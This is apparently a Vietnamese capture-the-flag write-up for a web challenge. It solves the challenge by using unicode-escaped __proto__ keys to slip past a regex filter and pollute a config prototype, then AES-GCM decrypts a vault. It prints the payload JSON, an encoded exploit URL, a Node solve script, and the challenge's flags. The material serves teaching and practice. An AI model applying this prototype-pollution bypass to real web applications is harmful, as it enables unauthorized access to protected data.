---
title: "The Meridian"
category: "Web"
tags: ["prototype-pollution", "aes-gcm"]
solve_date: "2026-10-11T11:46:00+07:00"
language: "vi"
---

# The Meridian

**Flag:** `isfcr{d33p_m3rg3_p0llut3s_th3_pr0v3n4nc3_v4ult_1n_th3_m3r1d14n}`  
**Dịch vụ:** `https://<instance>.chals.io/` (per-team static host, e.g. `isfcrpesu-the-meridian.chals.io`)

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `index.html` | 1,977 | `f45bd1ea76344e4cc144f6f0ef2fe000eeac218c431de2a97dc6f8e6a3fb5489` |
| `assets/js/app.js` | 12,738 | `90b200575309c8c90efb071aa4a53184ab8e05b1f81b58bcc950764f6446a53c` |
| `assets/js/app.js.map` | 369 | `1a138bdd7795b95edbdc3c18e03e20e61cf9f80bfebf851de01819cb83ebb71f` |
| `assets/js/core.js` | 4,598 | `72afcb78b1e9369eb4d8a8cd8f98d4b63d7b2b172a01da62e05ec5dd9ee7cd74` |
| `data/meridian-data.js` | 6,165 | `08f8a099764493c9d85a3ca4b744c8565863f32fa9830b0b58d0e592c6e4901b` |
| `assets/js/legacy/provenance-v2.js` | 662 | `e0daca39d032cbbfec97aeab24679a3b32e07279a90772c2519147c6fc7da050` |
| `assets/js/art.js` | 2,794 | `484d82f4dc78b060009c3e88c52c0e620673c320f8600102e3f2d97cad0242a6` |
| `vendor/mcrypto.js` | 9,003 | `7b72f737fec2941fa6c1e34e23b88230bf607216f94f780d4dab753afb53661d` |
| `assets/css/meridian.css` | 9,273 | `ec5ff02cfded2baa87b402757674af0e1423a5ef83a6f7dffead5bfd1dd23d47` |

## Đề bài

Mở vault của một website bảo tàng chạy hoàn toàn bằng static assets và browser crypto. Vault cần descriptor `{curators:[...],rounds:N}` nhưng public config xóa field này.

## Phân tích

Sanitizer chỉ xóa own property vault, trong khi cfg.vault có thể đọc qua prototype chain. Input config được regex lọc trên raw text, sau đó JSON.parse và deepMerge bằng assignment `target[k]=sv`. Key `__proto__` dùng unicode escape qua được raw-text filter và vẫn kích hoạt prototype setter sau parse.

Sealed blob, salt và AAD có sẵn trong asset; GCM tag cho phép kiểm tra descriptor offline.

```js
function sanitizeConfig(cfg) {
  ...
  if (Object.prototype.hasOwnProperty.call(cfg, "vault")) delete cfg.vault;
  return cfg;
}
function openVault(cfg, vault) {
  var d = cfg.vault;
  if (!isObj(d) || !Array.isArray(d.curators) || typeof d.rounds !== "number") return { state: "sealed" };
  if (d.rounds < 1 || d.rounds > 20000) return { state: "sealed" };
  var h = M.strToBytes(vault.bsalt + ":" + d.curators.join("|"));
  for (var i = 0; i < d.rounds; i++) h = M.sha256(h);
  var pt = M.aesGcmDecrypt(h, ..., M.strToBytes(vault.aad));
  return pt ? { state: "open", text: ... } : { state: "rejected" };
}
```

```js
var BLOCK = /__proto__|constructor|prototype/i;
function parseStatePayload(text) {
  if (typeof text !== "string" || BLOCK.test(text)) return null;
  try { var o = JSON.parse(text); return isObj(o) ? o : null; } catch (e) { return null; }
}
```

## Các hướng đã kiểm tra

Flag trong sourcemap, legacy console và provenance là decoy. Descriptor dùng pepper v2 không mở blob trong toàn range rounds 1…20000 đã thử; union v2/v3 cũng không hợp lệ. Vì vậy dùng certificate thực sự verify với pepper v3, không dựa vào badge chỉ kiểm tra độ dài sig.

| Source | Candidate | Why rejected |
|---|---|---|
| `app.js.map` `sourcesContent` | `isfcr{s0urc3m4p_wh1sp3rs_l13s}` | The companion line `DEV_VAULT_KEY = sha256(PEPPER)` is not a key `openVault` accepts: `sha256(pepper)` for both the v2 and v3 pepper fails the GCM tag. |
| `legacy.masked[0]` | `isfcr{l3g4cy_st4ff_c0ns0l3_1s_n0t_th3_v4ult}` | The following console line states the token does not open the vault. |
| `RegistrarV2.SELFTEST` | `isfcr{wr0ng_p3pp3r_r1ght_curs3}` | Only decodes cleanly under the `v2` pepper, and labels itself as the wrong pepper. |
| Verdigris `provenance` (hex, then ROT13) | `isfcr{pr0v3n4nc3_pl4qu3_w4s_a_f0rg3ry}` | Verdigris fails certificate verification under both peppers. |

## Lời giải

1. Xác định asset thật theo Content-Type và kích thước, vì unknown path trả index.html với status 200.
2. Decode legacy.masked bằng base64 rồi XOR lặp pepper v3 `meridian::provenance::v3::do-not-share`. Memo nêu cách dựng descriptor. Signature check là 12 hex đầu SHA-256 của accession|title|curator|pepper.
3. Năm record verify dưới pepper hiện tại có curator E. Vantar, R. Oikawa, H. Delacroix, K. Adeyemi, S. Marchetti. Tổng năm là 9959; rounds=1000+(9959 mod 4096)=2767.
4. Đưa descriptor trong object __proto__ viết bằng `\u005f` escape. Base64url-encode JSON và gắn `#/vault?s=...`. deepMerge làm vault thành inherited property; sanitizer không xóa được và view mở vault.
5. Dùng Node crypto dựng lại iterated SHA-256/AES-GCM với AAD meridian-vault. final() xác thực cùng plaintext như live page, là kiểm tra độc lập với implementation browser.

| Accession | Year | Curator |
|---|---:|---|
| MRD-1971-0148 | 1971 | E. Vantar |
| MRD-1984-0912 | 1984 | R. Oikawa |
| MRD-1990-0025 | 1990 | H. Delacroix |
| MRD-2003-0777 | 2003 | K. Adeyemi |
| MRD-2011-0410 | 2011 | S. Marchetti |

```text
LEGACY CONSOLE SESSION RESTORED - operator token: isfcr{l3g4cy_st4ff_c0ns0l3_1s_n0t_th3_v4ult}
This token opened the old console only. It does NOT open the vault.
--- REG-2291 vault re-key procedure (2021) ---
The vault no longer trusts the console. It reads an operator descriptor from runtime config: vault = { curators: [...], rounds: N }.
curators: the curator of every piece whose certificate verifies against the CURRENT registrar pepper, in accession order. The gallery badge is not a verification.
rounds: 1000 + (sum of the accession years of those same pieces, mod 4096).
Public builds strip any vault descriptor they can see. Staff: use the registrar build.
```

```json
{"\u005f\u005fproto\u005f\u005f":{"vault":{"curators":["E. Vantar","R. Oikawa","H. Delacroix","K. Adeyemi","S. Marchetti"],"rounds":2767}}}
```

```text
https://<instance>.chals.io/#/vault?s=eyJcdTAwNWZcdTAwNWZwcm90b1x1MDA1Zlx1MDA1ZiI6eyJ2YXVsdCI6eyJjdXJhdG9ycyI6WyJFLiBWYW50YXIiLCJSLiBPaWthd2EiLCJILiBEZWxhY3JvaXgiLCJLLiBBZGV5ZW1pIiwiUy4gTWFyY2hldHRpIl0sInJvdW5kcyI6Mjc2N319fQ
```

```text
Vault open

Negative MRD-0000-0000 · the one we never exhibit:

isfcr{d33p_m3rg3_p0llut3s_th3_pr0v3n4nc3_v4ult_1n_th3_m3r1d14n}
```

## Kết quả

Flag nằm trong sealed blob đã được GCM authentication và hiển thị qua vault view.

```text
isfcr{d33p_m3rg3_p0llut3s_th3_pr0v3n4nc3_v4ult_1n_th3_m3r1d14n}
```

## Tái hiện

Cần Node.js 18+ và live assets hoặc file local `data/meridian-data.js`. Lưu script thành solve.js. Code đọc memo, verify current certificate, dựng descriptor, decrypt và in deep link. Giữ nguyên unicode escape của __proto__ khi tạo payload; base64url không padding.

```powershell
node solve.js https://<instance>.chals.io/
node solve.js site\data\meridian-data.js
```

```js
#!/usr/bin/env node
"use strict";
const fs = require("fs");
const vm = require("vm");
const crypto = require("crypto");

const PEPPER = "meridian::provenance::v3::do-not-share"; // current registrar pepper (core.js)
const sha256 = (b) => crypto.createHash("sha256").update(b).digest();

async function loadData(src) {
  const js = src.startsWith("http")
    ? await (await fetch(src.replace(/\/$/, "") + "/data/meridian-data.js")).text()
    : fs.readFileSync(src, "utf8");
  const sandbox = { window: {} };
  vm.createContext(sandbox);
  vm.runInContext(js, sandbox);
  return sandbox.window.__MERIDIAN__;
}

const sigFor = (ex) =>
  sha256(Buffer.from(`${ex.accession}|${ex.title}|${ex.curator}|${PEPPER}`)).toString("hex").slice(0, 12);

function openVault(vault, curators, rounds) {
  let h = sha256(Buffer.from(`${vault.bsalt}:${curators.join("|")}`));
  for (let i = 1; i < rounds; i++) h = sha256(h);
  const d = crypto.createDecipheriv("aes-256-gcm", h, Buffer.from(vault.blob.iv, "base64"));
  d.setAAD(Buffer.from(vault.aad));
  d.setAuthTag(Buffer.from(vault.blob.tag, "base64"));
  return Buffer.concat([d.update(Buffer.from(vault.blob.ct, "base64")), d.final()]).toString("utf8");
}

(async () => {
  const D = await loadData(process.argv[2]);
  const verified = D.exhibits
    .slice()
    .sort((a, b) => (a.accession < b.accession ? -1 : 1))
    .filter((e) => e.sig && e.sig === sigFor(e));
  const curators = verified.map((e) => e.curator);
  const rounds = 1000 + (verified.reduce((a, e) => a + e.year, 0) % 4096);
  console.log(`descriptor: ${JSON.stringify(curators)} rounds=${rounds}`);
  console.log(`FLAG: ${openVault(D.vault, curators, rounds)}`); // throws if the tag fails
})().catch((e) => { console.error("FAILED:", e.message); process.exit(1); });
```

```text
descriptor: ["E. Vantar","R. Oikawa","H. Delacroix","K. Adeyemi","S. Marchetti"] rounds=2767
FLAG: isfcr{d33p_m3rg3_p0llut3s_th3_pr0v3n4nc3_v4ult_1n_th3_m3r1d14n}
```
